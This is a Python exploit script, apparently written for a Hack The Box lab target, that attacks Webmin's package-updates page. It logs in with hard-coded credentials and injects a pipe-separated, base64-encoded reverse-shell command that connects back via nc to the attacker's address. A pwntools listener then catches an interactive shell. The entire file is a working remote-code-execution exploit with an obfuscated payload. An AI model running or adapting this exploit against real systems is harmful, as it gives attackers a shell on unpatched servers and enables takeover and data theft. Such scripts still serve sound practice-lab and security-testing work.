#!/usr/bin/python3

from pwn import *

import pdb
import urllib3
import html

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://10.10.10.160:10000/session_login.cgi"
package_updates_url = "https://10.10.10.160:10000/package-updates/update.cgi"
burp = {'https': 'http://127.0.0.1:8080'} # Proxie
lport = 443

def makeRequest():

    urllib3.disable_warnings() # SSL
    s = requests.session()
    s.verify = False

    post_data = {
        'page': '',
        'user': 'Matt',
        'pass': 'computer2008'
    }

    headers = {
        'Cookie': 'testing=1'
    }

    r = s.post(login_url, data=post_data, headers=headers)

    post_data = [
        ('u', 'acl/apt'),
        ('u', ' | bash -c "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNyA0NDMgPi90bXAvZgo= | base64 -d | sh"'),
        ('ok_top', 'Update Selected Packages')
    ]

    headers = {
        'Referer': 'https://10.10.10.160:10000/'
    }

    r = s.post(package_updates_url, data=post_data, headers=headers, proxies=burp)
    output = html.unescape(re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)[0]).strip()

    print(output)
if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
